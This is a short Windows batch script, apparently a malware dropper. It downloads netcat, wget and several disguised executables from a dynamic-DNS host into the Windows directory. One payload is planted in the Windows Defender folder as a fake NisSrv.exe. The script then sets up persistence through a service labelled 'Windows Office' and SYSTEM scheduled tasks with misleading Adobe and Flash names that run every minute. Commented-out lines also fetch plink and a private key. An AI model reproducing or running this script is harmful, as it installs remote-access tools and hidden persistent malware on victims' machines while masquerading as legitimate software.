rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/plink.exe','%windir%\plink.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/mila.ppk','%windir%\mila.ppk')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win.bat','%temp%\win.bat')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/nc64.exe','%windir%\nc64.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/wget.exe','%windir%\wget.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/wofficeie1.exe','%windir%\wofficeie1.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/cacert.pem','%windir%\cacert.pem')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/woffice.exe','%windir%\woffice.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
rem %windir%\wofficeie1.exe
SLEEP 10
taskkill /f /im wup.exe
copy /y %windir%\wofficeie1.exe %windir%\wup.exe
sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
net start wup
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
